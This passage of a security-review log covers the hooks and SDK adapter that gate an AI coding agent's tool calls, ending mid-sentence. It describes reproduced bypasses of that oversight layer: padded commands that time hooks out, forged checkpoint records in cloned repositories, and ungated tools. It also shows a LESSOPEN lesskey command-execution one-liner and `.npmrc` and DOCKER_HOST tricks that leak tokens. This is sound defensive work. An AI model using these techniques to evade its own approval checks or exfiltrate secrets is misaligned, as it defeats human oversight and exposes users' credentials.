# Security loop on the safety layers

Rounds of security review of the layers that must fail closed (STANDARD
1.2.0 §5.18, spec/SECURITY.md): the plugin's hooks and skills, the Python
SDK adapter, the TypeScript package and the Standard Agents binding. Each
defect below was reproduced by an independent verifier before it was fixed.
The whole-change review rounds before this loop are recorded in PHASE4.md;
each round here checked that their fixes hold.

## Round 1

Six defects, all in the plugin's hooks, with SDK siblings for 4 and 2. Each
fix has tests that fail on the code before it (checked by running the new
tests with the old hooks, adapter and tracker stashed: 48 of them failed,
plus the shipped-state-file test of the tracker; the rest are controls).

### 1. Quadratic trim before the 4096-byte bound (medium)

Round 2 bounded `split_words` at 4096 bytes (PHASE4.md, hooks-skills 8), but
`classify_bash` trimmed the command first, and the trim of trailing blanks,
`${command##*[![:space:]]}`, costs the line times its run of blanks: 50,000
trailing blanks took 44 s (60 s on the reporter's machine), 100,000 leading
ones 10 s. A hook that gives no verdict lets Claude Code run the call. The
fix holds round 2's bound and closes its sibling.

- Fix: `classify_bash` checks `${#command}` against 4096 before any trim
  (over it: `mutate`); `posttooluse_take_checkpoint.sh` does the same before
  its trims (over it: no marker). After: 50,000 trailing spaces 23 ms,
  200,000 leading spaces 31 ms, 200,000 trailing tabs 37 ms; the worst case
  under the bound (4,084 trailing blanks) 254 ms.
- `hooks/hooks.json`: the PreToolUse hook has `"onFailure": "block"` and
  `"timeout": 30`. Claude Code 2.1.325+ blocks the call when a command hook
  with that setting fails, cannot start or times out (read from its binary:
  `Iq`, and the "gave no verdict in time" path); its default timeout is
  600 s. SECURITY.md §5.5 no longer says there is no fail-closed hook mode:
  it says a Claude Code without the setting ignores it.
- Tests: `TestShellHookTimeBound` in `tests/test_pretooluse_hooks.py`
  (50,000 trailing spaces and tabs, 200,000 leading spaces, and `ls` with
  50,000 trailing spaces, each F501 within 10 s; the hook entry's
  `onFailure` and `timeout`);
  `test_long_blank_runs_are_not_trimmed_and_write_no_marker` (three) in
  `tests/test_hook_checkpoint_lifecycle.py`. The padded ones ran past the
  30 s subprocess timeout before.
- Sibling checked: the SDK mapper's classifier is linear (`str.strip`;
  200,000 blanks in 0.06 s). No skill hook uses these expansions.

### 2. Rollback check trusted records in the work tree (medium)

`recorded_commit` accepted `.claude/checkpoints/commits/<sha>`, or a marker
naming `<sha>`, under the project directory, and a rollback exits 0 before
the marker and mode checks: a cloned repository that tracks an entry for a
hidden merge commit made `git stash apply <merge>` run with no checkpoint
and no approval in any mode. Sibling: a tracked `.claude/checkpoint.ok` with
fresh times authorised a gated call.

- Root cause: the layer's records were files repository content can supply.
  Fix: `posttooluse_take_checkpoint.sh` enters each commit in the project's
  git directory, `<git dir>/acs/checkpoints/commits/<sha>` (`git rev-parse
  --absolute-git-dir`), which no clone, checkout or applied stash writes
  (an applied stash can restore untracked files into the work tree); the
  pre-tool-use hook and the rollback skill's command hook look there only.
  The marker's `commit` no longer authorises a restore (the take hook
  always enters the commit first), and a restore must run in the project's
  repository: the payload's `cwd` must have the project's git directory (a
  restore into another repository or worktree restores other state).
  Without a git directory, a commit is not entered and no marker names it.
- A marker git tracks authorises nothing: `git -C .claude ls-files
  --error-unmatch -- checkpoint.ok` (asked from the marker's directory, so a
  `.claude` that is a symbolic link or a submodule is read where it leads);
  F501, and the file is left in place.
- A gated call that names the records (a Write, Edit, MultiEdit or
  NotebookEdit path, or a Bash command, holding `checkpoint.ok`,
  `.claude/checkpoints` or `acs/checkpoints`) is refused with F504 before it
  can use a checkpoint. Reading them is not refused; a path a command builds
  at run time is not seen (it stays a gated `mutate`), as SECURITY.md §5.5
  says.
- SDK sibling: `CheckpointTracker` loaded `tracker_state.json` from its
  `checkpoint_dir` (`.checkpoints` in the project by default) whoever wrote
  it, so a cloned state file's active checkpoint authorised a call within
  30 minutes of its `created_at` (rollback was safe: `has_commit` counts only
  checkpoints taken since the adapter started). Fix: a state file git
  tracks is not loaded (`_tracked_by_git`, the same question asked from the
  file's directory; a git that does not answer in 10 s counts as tracked);
  the tracker starts fresh and logs why.
- Tests: `TestShellHookTrustsOnlyItsOwnRecords` (a clone with a tracked
  entry and marker: `git stash apply <merge>` is F501 in bypassPermissions
  and default modes; the tracked marker is refused with "tracked by git"
  and kept; the same through a `.claude` symlink to a tracked directory; an
  untracked marker still authorises one call; a restore with `cwd` in
  another repository is F501, in the project or a subdirectory of it
  allowed; six calls that write the records are F504; reading them and an
  Edit of a document that mentions them pass), `test_rollback_restores_only_a_recorded_checkpoint`
  (now in a repository); `TestRollbackCommandHook::test_a_cloned_entry_or_marker_restores_nothing`
  and `test_a_restore_in_another_repository_restores_nothing` (sh and bash);
  `test_a_commit_outside_a_repository_writes_no_marker`;
  `tests/test_checkpoint_persistence.py::TestShippedStateFile` (a cloned
  state file authorises nothing; the same file untracked still loads). The
  fixtures that planted an entry by hand plant it where the take hook
  writes it, and the lifecycle tests that take a checkpoint run in a
  repository.
- The rollback skill's hook reads the call's `cwd` and command with one `jq`
  call (it read stdin with `cat`, which a test's `PATH` without `jq` lacks).

### 3. Only five tools were routed to the pre-tool-use hook (medium)

`hooks.json` matched `Write|Edit|MultiEdit|NotebookEdit|Bash`, and the hook
answered `exit 0` for any other tool: `Monitor` (a built-in tool that runs a
shell command), `PowerShell`, `ExitWorktree` (removes a worktree and its
uncommitted work) and every MCP tool ran with no checkpoint, and with no
approval where Claude Code asks no one. §5.18.2 requires an unbound tool's
call to be treated as a mutation; SECURITY.md called this a host gap,
though Claude Code routes every tool to a `*` matcher.

- Fix: matcher `*`. The hook lets pass only `UNGATED_TOOLS`, the SDK
  mapper's static tools whose capability needs neither a checkpoint nor
  approval (Read, Glob, Grep, LS, WebFetch, WebSearch, Task, Agent, Skill,
  AskUser, AskUserQuestion, TodoRead, TodoWrite, TaskList, TaskGet,
  TaskCreate, TaskUpdate, ToolSearch, BashOutput, TaskOutput,
  ListMcpResourcesTool, ReadMcpResourceTool, ExitPlanMode); Write, Edit,
  MultiEdit and NotebookEdit stay `mutate`, Bash is classified by its
  command, and every other tool is an unbound `mutate`, whose approval
  request says `(unbound: treated as a mutation, STANDARD 1.2.0 §5.18.2)`.
  This agrees with the mapper, which maps Monitor, PowerShell and unknown
  tools to `UNCLASSIFIED_TOOL`; `Monitor`'s command is not read as Bash's,
  since the mapper does not read it either.
- Tests: `TestShellHookRoutesEveryTool` (matcher `*`; six unbound tools are
  F501 without a marker, F502 in bypassPermissions with one, and asked with
  the unbound reason in default mode; seven ungated tools pass);
  `tests/test_hook_lists_match_mapper.py`: `UNGATED_TOOLS` are mapper tools
  needing neither, every tool the mapper gates is off the list, and
  Monitor, PowerShell and an MCP tool are gated in both. The matcher tests
  in `tests/test_hooks_unit.py` accept `*`, which routes every tool.

### 4. Turn boundaries the hooks never saw; scope never stated (medium)

Only `Stop` ended the marker. Claude Code runs `StopFailure` in place of
`Stop` when an API error ends the turn, an interrupt or a killed session
may run neither, so a marker stayed valid into the next turn or session for
up to 30 minutes (the verifier reproduced it: an edit between turns, then a
Write in the next turn used the old marker). The cross-session use the
report led with is not a violation once the scope is stated: the hooks'
records are per project directory.

- Fix: `stop_end_checkpoints.sh` is also registered on `StopFailure`,
  `UserPromptSubmit` (the next turn starts: this covers interrupts and
  crashes within a session), `SessionStart` and `SessionEnd`. It prints
  nothing and exits 0 (a UserPromptSubmit hook that exits 2 would refuse
  the prompt). SECURITY.md §5.5 states the scope (the project directory,
  every session and subagent in it, one marker, its history and the commit
  entries), the boundaries and the maximum age; hooks/README says the same.
- SDK sibling: the adapter's boundaries were Stop alone (SubagentStop
  resolves holds and is not a boundary). Fix: `wrap_options()` adds a
  `UserPromptSubmit` hook, the same boundary (`_make_boundary("turn
  started")`): what a turn left when its Stop never came ends at the next
  prompt. The adapter's conformance statement, its docstrings and the SDK
  guide name both boundaries.
- Tests: `test_every_boundary_event_ends_the_marker` (hooks.json) and
  `test_a_marker_left_by_an_earlier_turn_authorises_nothing` (each of the
  five events) in the lifecycle tests;
  `TestTurnEndReleasesLeftoverReservation::test_the_next_prompt_ends_what_a_turn_without_stop_left`
  (a hold and a second valid checkpoint, then UserPromptSubmit: the hold is
  used, nothing validates, a boundary record is written).

### 5. The log hook dropped input jq could not parse (medium)

`posttooluse_log_tool.sh` read the tool name with `jq ... || tool_name=""`
and exited 0 silently when it was empty, so a call whose input or result
nested past jq's depth limit (253 here), or held a lone high-surrogate
escape (what JSON.stringify writes for a string cut inside an emoji), was
not logged and not reported, against §6.4's "never silently".

- Fix: a jq failure on the input is reported (`fail`: exit 1, the reason
  with jq's first error line, which names a position and no content); only
  valid JSON that is not an object with a string `tool_name`, or no input,
  exits 0 as no tool call. Input that is not JSON at all, or a JSON value
  followed by text, is now reported the same way (two existing tests that
  expected exit 0 for it now expect the report). The pre-tool-use hook
  already blocked such input with R407, and the take hook writes no marker
  for it.
- Tests (`tests/test_hooks_unit.py`):
  `test_a_call_nested_past_jqs_limit_is_reported` (depths 253, 300 and
  10,000, in `tool_input` and in `tool_response`),
  `test_a_call_with_a_lone_surrogate_is_reported`,
  `test_input_jq_cannot_parse_is_reported` (two), and
  `test_input_without_a_tool_name_is_not_logged` (valid JSON and empty
  input still exit 0 with nothing on stderr).

### 6. The pre-tool-use hook ignored ACS_CHECKPOINT_MAX_AGE (low)

The take and log hooks read `ACS_CHECKPOINT_MAX_AGE` (the log records it on
every line as the setting the call was held to), but the pre-tool-use hook
checked only the marker's `expires_at` and the fixed 1800 s cap, so a
marker written under a longer setting, or by another writer (the SDK's
`CheckpointTracker(marker_dir=...)`), was honoured past the stated age.

- Fix: the hook reads the setting as the other two do (1 to 1800, else
  1800) and treats a marker past `created_at + max_age` as expired (F501,
  filed under `ended/`).
- Test: `test_the_layer_maximum_age_applies_to_a_marker_written_under_a_longer_one`
  (a marker 600 s old with 1200 s left is F501 under a 60 s maximum and
  filed under `ended/`; a fresh one passes under the same setting).

### Documentation

SECURITY.md §5 (the figure's text, §5.1, §5.2, the §5.4 rows for the plugin
hooks and the rollback skill, §5.5's scope and host gaps), hooks/README
(table, flow, configuration with the new `hooks.json`, classification,
records, boundaries, log hook; the audit-line example recomputed for the new
`config_sha256`), CLAUDE.md's hook list, README's hook table, the SDK guide
(boundaries), the EU AI Act risk page (the hook asks for approval and gates
unknown tools), the findings file's rollback resolution, and CHANGELOG
Upgrading (a new "fail-closed fixes" item for the plugin hooks; the SDK's
UserPromptSubmit hook and state-file rule). No version changes.

### Checks after round 1

- Python: `pytest tests/` (4769 passed, 18 skipped); the hook, skill,
  persistence and integration files rerun after formatting (724 passed);
  ruff check and format with CI's lists; mypy; every `tools/validate_*.py`
  of CLAUDE.md, `validate_workflows.py --strict` and every domain catalog
  and example `--strict`; the generators' `--check` (`sync_skill_schemas`
  107, `gen_runtime_fixtures` 368, `gen_call_fixtures` 35 and 30,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- The reporters' probes rerun on this tree: `rm -rf a.txt` with 50,000
  trailing spaces, 200,000 leading spaces or 200,000 trailing tabs is F501
  in 23 to 37 ms (60 s and more before); the clone, Monitor, boundary,
  deep-input and maximum-age probes are the tests above.
- Rust: no Rust source changed (the WebAssembly build for the package was a
  no-op rebuild), so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build:wasm, build, check, test (1877);
  the binding's check and test (191, 2 skipped). No call fixture changed;
  the adapter's conformance statement gains its UserPromptSubmit boundary.
- Site: `npm run check` and `npm test` (1173). `scripts/check-runs.mjs` was
  not run (no Chromium here); the one enforced page touched,
  /guides/claude-agent-sdk/, gains five words in the Checkpoint Lifecycle
  section's Validity item and one word in a list of hooks.

### Batch 1 recheck: the four reported defects and their siblings

Security round 1's first batch (defects 1 to 4 above, as an independent
verifier reproduced them on 99c37dd) was rechecked on this tree, b61b3b1,
before anything else was changed. Each fix holds:

- 1: the reporters' probe, `rm -rf a.txt` padded with 50,000 trailing
  spaces, 200,000 leading spaces, 200,000 trailing tabs or 1,000,000
  trailing spaces, is F501 in 22, 32, 40 and 107 ms (each under `timeout
  120` and a 4 GB address-space limit); `hooks.json` gives the hook
  `onFailure: "block"` and `timeout: 30`, which Claude Code 2.1.325's binary
  honours for a command hook (`Iq`).
- 2: the clone tests (`TestShellHookTrustsOnlyItsOwnRecords`,
  `TestRollbackCommandHook`, `TestShippedStateFile`) pass; the SDK holds too:
  a checkpoint a first adapter took on a `checkpoint_dir` does not authorise
  a gated Write in a second adapter on the same directory ("no checkpoint
  was taken in this scope"), and the tracker drops a loaded checkpoint dated
  after its load, so a planted state file never authorises a call.
- 3: `Monitor`, `PowerShell`, `ExitWorktree` and an MCP tool are gated
  (`TestShellHookRoutesEveryTool`, `test_hook_lists_match_mapper.py`).
- 4: each boundary event ends the marker (the lifecycle tests); the SDK's
  UserPromptSubmit boundary test passes; the Standard Agents binding's
  boundary is a new execution (`flowId`), so it has no turn to miss.

The targeted files (hooks, lifecycle, mapper lists, skill hooks,
persistence: 697 tests) passed before any change. Four siblings were found
and fixed; each new test was run against the code before the fix and fails
there.

#### 7. The audit skill's hook read its append form in quadratic time (medium)

Sibling of 1: a PreToolUse command hook whose run outlives its time limit
gives no verdict, and the call runs. The audit skill's `Bash` hook read
`printf '%s\n' '<record>' >> ...records.jsonl` with `${REST%%\'*}` and
`${REST#*\'}`; with no quote after the record, the second costs the line
times itself (dash, which runs `sh -c` here: 25 KB 0.94 s, 50 KB 3.7 s,
100 KB 15.1 s, so about 700 KB outlives Claude Code's default 600 s; bash's
`%%` is quadratic too, 5.1 s at 1 MB). The check is the §6.7 credential scan
of an audit record (§5.18.10).

- Fix: the form is read with one `case` pattern per allowed destination
  (`"$FORM"*"$TO"`) and the removal of the literal prefix and suffix; a
  record holding a quote or a line break is not the form (as before). In
  both shells 1 MB takes at most 25 ms.
- Tests: `TestAuditCommandHook::test_a_long_line_is_decided_in_bounded_time`
  (sh and bash: 200 KB and 1 MB records with no closing quote, a 1 MB
  record that is not JSON, and a valid 1 MB record, each decided within
  10 s). All 8 failed on the old hook (each hit the 30 s subprocess
  timeout).
- Siblings checked: the persist, rollback and send hooks, and the shared
  secret scan, took at most 75 ms on 400 KB adversarial inputs (repeated
  `password=`, `a://b:`, `authorization: `, blanks before a restore id,
  newline-separated restores, `http://a`, numeric hosts, a long option
  cluster); the log hook took at most 367 ms on a 1 MB command and output
  (blanks, quotes, `a/` segments); the take hook stops at 4096 bytes before
  any trim.

#### 8. The skill command hooks did not block when they failed (medium)

Sibling of 1's `onFailure` fix: `hooks.json` gave the plugin's PreToolUse
hook `onFailure: "block"`, but the four blocking skill command hooks
(audit, persist, rollback, send), which make code-decided checks (§6.7
secrets, the §5.18.10 destination row, F503 rollback history), set neither
it nor a `timeout`: one that crashed or timed out let the call run. Claude
Code parses a skill's frontmatter `hooks` with the settings' hook schema
(`sQ`), whose command hook takes `timeout` and `onFailure`.

- Fix: each sets `timeout: 30` and `onFailure: block`.
- Test: `test_a_command_hook_that_fails_or_times_out_blocks_the_call` (four);
  all four failed before.

#### 9. The SDK adapter's safety hook did not block when it failed in the CLI (medium)

SDK sibling of 1's `onFailure` fix. The adapter's PreToolUse callback
refuses with R407 when a check fails inside it, but a callback that fails
or gives no verdict within the matcher's timeout (60 s by default), as the
CLI sees it, was no decision there: the call ran (in `bypassPermissions`
outright). `claude-agent-sdk` 0.2.172 carries `HookMatcher.on_failure`, and
with `"block"` it refuses to connect to a Claude Code that does not honour
it (`hook_on_failure_supported`, which Claude Code 2.1.325 answers).

- Fix: `wrap_options()` registers the safety hook's matcher with
  `on_failure="block"` (`_wrap_hook(..., on_failure=...)`; the dict form
  without the SDK carries it too). An SDK whose `HookMatcher` lacks the
  field cannot ask for it: the adapter logs a warning, and the conformance
  statement lists that host gap. The other hooks keep the SDK's default (the
  boundary and PostToolUse callbacks catch their own errors; a PostToolUse
  block cannot undo a call).
- Tests (`TestPreToolUseInWrapOptions`):
  `test_the_safety_hook_blocks_when_it_fails_in_the_cli` (the safety
  matcher blocks, a caller's matcher and every other hook are unchanged)
  and `test_without_the_sdk_the_dict_form_carries_it`; both failed before.
  No call fixture changed; the statement gains a host gap.

#### 10. The records guard read one spelling of each path (low)

Sibling of 2's F504 guard, which tests the call's text for `checkpoint.ok`,
`.claude/checkpoints` and `acs/checkpoints`: `.git/acs//checkpoints/...`,
`.git/acs/./checkpoints/...`, `.git/acs/x/../checkpoints/...`,
`.git/ACS/Checkpoints/...` (the same directory on a case-insensitive file
system) and `.claude/Checkpoint.OK` were not refused, so an entry, a
permanent pass for a restore, could be written by a call a person approves
as an ordinary write. Such a call still needed a checkpoint and approval.

- Fix: the text is read as a path is: case-insensitive, a run of slashes
  and `./` segments as one slash (a regular expression, linear in the
  text), and, in a text of at most 4096 bytes, each `x/../` resolved
  (jq's `split` and `reduce`, whose cost grows faster than the text: 1 MB
  of `a/` took 11 s, so a longer text is not resolved; a longer path cannot
  be opened, and a longer command is a `mutate` already). `Monitor` and
  `PowerShell` commands are read as Bash's. A megabyte command takes
  129 ms. (jq 1.7's regex `splits` is quadratic in the number of matches:
  not used.)
- Tests: `test_another_spelling_of_the_records_is_refused` (13: five
  spellings of an entry, the marker in other case, `.claude//checkpoints`,
  three Bash spellings, Monitor, PowerShell, and a padded command over
  4096 bytes); all 13 failed before. `test_a_long_path_is_read_in_bounded_time`
  (a 1 MB command of segments, decided within 10 s) is a control.
- The SDK adapter keeps no records in the work tree that authorise a call
  (see 2 above), so it has no such guard to align.

#### Documentation

SECURITY.md (§5.1's records sentence, the §5.4 plugin row for the records,
the consequence on the skills' command hooks, §5.5's host gap on
`onFailure` and its adapter paragraph), hooks/README (records, skill
hooks), CLAUDE.md's hook list, the SDK guide (a troubleshooting entry for
the connection error), the adapter's docstrings and conformance statement,
and CHANGELOG Upgrading (the plugin hooks' fail-closed item, the SDK item).
No version changes.

#### Checks after the batch 1 recheck

- Python: `pytest tests/` (4797 passed, 18 skipped; 28 more than after
  round 1, the new tests); ruff check and format; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1877; the
  WebAssembly build reused); the binding's check and test (191, 2 skipped).
  No call fixture changed.
- Site: `npm run check` and `npm test` (1173). `scripts/check-runs.mjs` was
  not run (no Chromium here); the enforced page touched,
  /guides/claude-agent-sdk/, gains one entry with a fence in its
  Troubleshooting run, an exempt run of that form.

### Batch 2: five reported defects

Security round 1's second batch: five defects an independent verifier
reproduced on 99c37dd. Two were already fixed on this tree by the round's
first commit (b61b3b1); the other three, and two siblings found while
fixing them, are fixed here. Each fix has tests that fail on the code
before it (run with the old mapper, adapter and hook restored: 53 of the
new tests failed, 4 of them controls that fail there only because
`map_tool` took no `cwd`; the rest are controls that pass on both).

#### Already fixed: the log hook's jq depth limit, the hook's maximum age

- "Audit log hook drops a call silently when its JSON nests past jq's parse
  depth" is item 5 above. The reporter's probe on this tree: depths 254,
  300 and 10,000 in `tool_input`, and 300 in `tool_response`, each exit 1
  with "the hook input could not be parsed (jq: parse error: Exceeds depth
  limit ...) ... this tool call was not logged"; the tests of item 5 pass.
- "Pre-tool-use hook ignores the configured ACS_CHECKPOINT_MAX_AGE" is item
  6. The reporter's probe (a marker 600 s old with 1200 s left, the setting
  60): F501 "checkpoint has expired", the marker filed under `ended/`;
  `test_the_layer_maximum_age_applies_to_a_marker_written_under_a_longer_one`
  passes.

#### 11. less and more were read-only in the SDK mapper (high)

`_READ_ONLY_COMMANDS` held `less` and `more`, and `_writes` refused only
the less options it knew wrote (`+cmd`, `-o`, `-O`, `--log-file`). less
reads a lesskey source (`-k FILE`, `--lesskey-file`, `--lesskey-src`,
`--lesskey-content`, or any abbreviation, `--lesskey-s=`), whose `#env`
section sets `LESSOPEN`, which less runs when it opens a file, a pipe
included: `printf '#env\nLESSOPEN=|cmd; cat %%s\n' | less
--lesskey-src=/dev/stdin f` ran `cmd` with no checkpoint, no approval and no
destination check (the verifier ran a payload that wrote an environment
secret to a file and one that would send it with wget; the adapter allowed
both under `allowed_destinations`). The plugin hook never listed them.

- Root cause: an allow-listed command whose options were refused by a
  deny-list, against §5.18.3's worst case for any argument the classifier
  does not recognise; and a pager's behaviour also depends on files the
  classifier cannot read (`LESSOPEN` in the environment, a lesskey file in
  the home directory; macOS's `more` is less). Fix (`mapper.py`): `less`
  and `more` are off the list (and off `_ARGUMENT_WRITERS`, and `_writes`
  loses their rules): each is Bash's worst case, `mutate` and `send`. An
  agent has no terminal to page on; `cat` and `head` read the same.
- Tests (`tests/test_bash_classification.py`): `test_a_pager_is_not_read_only`
  (11: the pipe, a file, a compiled file, abbreviations, `less f`, `more
  f`, `cat f | more`; all failed before) and three more cases in
  `test_a_destination_policy_refuses_them` (the pipe, through the adapter
  with `allowed_destinations`: F504).

#### 12. git reads in a partial clone reach the promisor remote (medium)

In a partial clone, git fetches each object it lacks from the promisor
remote when a command reads it. `git show`, `git log -p` and `git diff`
were `observe` in both the mapper and the hook, so they reached that host
with no checkpoint, no approval and no destination check, and `git show
<any full id>` sent the 20 bytes the agent chose (the verifier's
GIT_TRACE_PACKET showed the `want` line). Reproduced here with a `file://`
partial clone: `git show HEAD~1:big.txt` and `git log -p` fetched (the
missing objects went from 2 to 1 to 0); `git stash create` and `git stash
apply <that commit>` fetched nothing.

- Fix, in both layers alike: a git command the allow-list reads as
  `observe` (one on the read-only list, `git stash list`, `git stash
  show`) gets the worst case where git may fetch: `git -C <dir> config
  --get-regexp '^(remote\..+\.promisor|extensions\.partialclone)$'` finds a
  key, or exits with anything but 1 (no git, no such directory, a
  configuration git cannot read). `<dir>` is the call's directory: the hook
  reads the payload's `cwd` (else the project directory); the mapper's
  `map_tool(tool, args, cwd=None)` takes it (None: the process's working
  directory) and asks `mapper.git_may_fetch(cwd)` (a function that raises
  counts as yes). `git stash create` and the restore of a recorded
  checkpoint keep their classes: they read only what the local state holds
  (the probe above), and gating `git stash create` would leave the plugin no
  way to take a checkpoint in a partial clone.
- The adapter passes the hook input's `cwd` from PreToolUse, PostToolUse and
  PostToolUseFailure. The permission callback's context carries none, so
  the PreToolUse hook keeps each call's `cwd` by call id
  (`_call_dirs`, dropped when the call reports back or at a boundary) and
  the callback classifies the call there: without it, the callback would
  read a call the hook put to a person as an observation and allow it.
- Cost: one `git config` for a git command that would observe (the hook's
  run went from 14 ms to 22 ms; the mapper's from under 1 ms to 3 to 10
  ms).
- Tests: a `partial_clone` fixture in `tests/conftest.py` (two commits
  served over `file://`, cloned with `--filter=blob:none`);
  `TestPartialClone` in `tests/test_bash_classification.py` (the fixture
  fetches what a read lacks; nine git reads, in the clone and a
  subdirectory, are the worst case; a full clone observes; `git stash
  create` and a recorded restore keep their classes; a missing directory,
  a lookup that raises and no git are the worst case; a destination policy
  refuses `git show <id>` with F504 through the adapter; the permission
  callback refuses with F502 what the hook put to a person), and in
  `tests/test_hook_lists_match_mapper.py` the same in both layers (seven
  reads gated in both, the project directory when the payload has no
  `cwd`, a missing directory, a full clone and `ls` observe, `git stash
  create` still a checkpoint).

#### 13. A quoted run of blanks made the SDK classifier quadratic (low)

`_DESTRUCTIVE_PATTERNS`' alternative `\s+(>|>>)\s`, matched against a
command's joined words, was retried from every blank of a run and
backtracked over the run: `ls "` + 40,000 blanks + `"` took 7 to 8 s, and
each call is classified by several hooks. The verifier showed that an
overrun is refused by the CLI (§5.18.8), so this was a bound, not a
fail-open path.

- Fix (`mapper.py`): a command over 4096 UTF-8 bytes (the plugin hook's
  bound, counted alike) is the worst case before any pattern runs; and the
  alternative is gone: `_simple_commands` reads the line's redirections and
  gives an output redirection to anything but `/dev/null` the worst case
  first, so it only matched a quoted `>` in an argument (`grep " > " f`,
  `mutate` before, `observe` now). At the bound the slowest form measured
  (repeated `awk ` words) takes 34 ms, a quoted run of blanks 3 ms.
- Tests: `test_a_command_over_4096_bytes_is_the_worst_case_at_once` (four,
  within 1 s; all failed before), `test_a_command_of_4096_bytes_is_still_read`
  (blanks and two-byte characters at exactly 4096 bytes are read; 4098
  bytes in 2052 characters are not; failed before), and `grep " > "
  notes.txt` in `test_read_only_arguments_stay_read_only`.

#### 14. npm list sent a project's registry token to the registry it names (high; sibling of 12)

Found while fixing 12: another read-only entry that reaches a host its
configuration names. `npm list` was read-only with listed options, but
npm's update check runs with plain `npm list` and asks the registry the
configuration names, a project's `.npmrc` included (repository content),
with the token that file gives for it, `${ENV}` expanded. Reproduced with
npm 11.20.0 and a local listener: a project `.npmrc` of
`registry=http://127.0.0.1:18765/` and
`//127.0.0.1:18765/:_authToken=${FAKE_SECRET}` made `npm list` send `GET
/npm` with `Authorization: Bearer s3cr3t-token`. It was `observe`: no
approval, no destination check.

- Fix: `npm list` is off the list (with its `_SUBCOMMAND_OPTIONS` entry),
  as `npm view` already was: the worst case. The plugin hook never listed
  it.
- Tests: `npm list`, `npm list --depth=0 --json` and `npm list -g --all`
  moved from `test_local_forms_of_those_commands_stay_read_only` to
  `test_a_command_that_reaches_another_host_gets_the_worst_case`, and `npm
  list` joins `test_a_destination_policy_refuses_them`; all failed before.
  `pip list` and `pip show` stay as round 2 left them: pip reads no
  project-level configuration.

#### 15. docker ps, images and logs reach the daemon DOCKER_HOST names (medium; sibling of 12)

The same class, as `kubectl get` was in round 2: the daemon is the one
`DOCKER_HOST` or the docker context names, over tcp or ssh (which runs ssh
with its configuration). Reproduced: with `DOCKER_HOST=tcp://127.0.0.1:18766`
a listener logged `/v1.56/containers/secret-data-leaked/json` for `docker
logs secret-data-leaked`, a name the agent chose.

- Fix: `docker ps`, `docker images` and `docker logs` are off the list:
  the worst case. The plugin hook never listed them.
- Tests: three cases in
  `test_a_command_that_reaches_another_host_gets_the_worst_case` and `docker
  logs` in `test_a_destination_policy_refuses_them`; all failed before.

#### Siblings checked

- The rest of the mapper's read-only list (`ls`, `cat`, `head`, `tail`,
  `file`, `stat`, `du`, `df`, `pwd`, `whoami`, `hostname`, `uname`, `date`,
  `cal`, `printenv`, `echo`, `printf`, `which`, `whereis`, `locate`, `find`,
  `grep`, `cut`, `sort`, `uniq`, `wc`, `diff`, `cmp`, `comm`, `tr`, `git
  ...`, `pip list|show`) was read for options or configuration that run a
  program or reach a host: none besides those above (`sort
  --compress-program`, `find -exec`, `git --output` were already refused).
  git configuration that runs a program on a read (`core.fsmonitor`,
  `diff.external`, a textconv driver) is written only by a gated call or
  the environment, not by repository content.
- The hook's read-only list is a subset of the mapper's (unchanged, and
  still checked by `test_read_only_list_is_a_subset_of_the_mappers`); it
  held none of the removed commands.
- No other classifier pattern is slower than linear in practice at 4096
  bytes (measured: repeated `curl `, `awk `, `xargs `, `python `, `sed `,
  `{a`, quoted words, `&& ls`, `-- `: 3 to 34 ms).

#### Documentation

SECURITY.md (§5.1: the partial-clone rule of the pre-tool-use hook; §5.5:
the adapter's classifier), hooks/README (classification), the SDK guide
(Bash classification: the pagers in the allow-list sentence, the table's
rows, and a partial-clone paragraph after the table), and CHANGELOG
Upgrading (the SDK's Bash fail-closed item, the plugin hooks' partial-clone
item; the earlier Bash items no longer name `less`, `more` or `npm list` as
read-only). No version changes.

The SDK guide is an enforced page of the figure-gap sweep. With the
partial-clone paragraph before the table, its run before the table grew
from 1772 px to 1986 px (measured with `scripts/check-runs.mjs` and the
local Chrome for Testing 153, not CI's headless shell): over the 1800 px
limit. The paragraph now follows the table (a figure), in a run of
1030 px, and the text before the table is no longer than before; the
page's longest enforced run is 1772 px, as at HEAD.

#### Checks after batch 2

- Python: `pytest tests/` (4848 passed, 18 skipped; 51 more than after
  batch 1); ruff check and format with CI's lists; mypy; every
  `tools/validate_*.py` of CLAUDE.md, `validate_workflows.py --strict` and
  every domain catalog and example `--strict`; the generators' `--check`
  (`sync_skill_schemas`, `gen_runtime_fixtures`, `gen_call_fixtures`,
  `gen_trigger_vectors`, `gen_standard_agents_binding`,
  `gen_capability_json_schemas`).
- Rust: no Rust source changed, so `cargo test` was not rerun.
- TypeScript: `packages/acs-core` build, check, test (1877; the
  WebAssembly build reused); the binding's check and test (191, 2
  skipped). No call fixture changed (the call fixtures hold no Bash
  call).
- Site: `npm run check`, `npm test` (1173), `npm run build` (check-dist
  passed) and `scripts/check-runs.mjs --paths /guides/claude-agent-sdk/`
  with the local Chrome (above).
- Probes cleaned up: the listeners stopped, the scratch repositories and
  the npm home removed.

### Batch 3: five reported defects

Security round 1's third batch: five defects an independent verifier
reproduced on 99c37dd, all in the Python SDK adapter and its tracker and
mapper; none was fixed by an earlier batch (the round's commits b61b3b1,
ffe4ac4 and 2fa8648 touched the hooks and the Bash classifier). Each fix
has tests that fail on the code before it (run with the old tracker,
mapper, bindings loader and adapter restored: 28 of the new or changed
Python tests failed, and the TypeScript package's new cycle test; the rest
are controls that pass on both).

#### 16. A checkpoint of another scope authorised calls; one checkpoint covered two calls (medium)

`CheckpointTracker.__init__` loaded every unused checkpoint in
`checkpoint_dir/tracker_state.json` as its own, and `validate_and_reserve`
held one for any call. The default `checkpoint_dir` (`.checkpoints`) is
shared by every adapter in a working directory, and the statement's scope
is "this adapter instance". Adapter B, built after adapter A took a
checkpoint, ran an unbound MCP call and a Write on A's checkpoint, and A
then ran its own Write on it: one checkpoint, two gated calls in two
scopes. After a restart, an adapter that took one checkpoint ran two
Writes, the second on the earlier process's. Each tracker also wrote the
shared file whole from its own copy, so a stale tracker dropped another's
newer records, or brought a used one back unused (the verifier's lost
update: a new adapter then ran a call on a checkpoint already used).

- Root cause: records read back from the state file were treated as
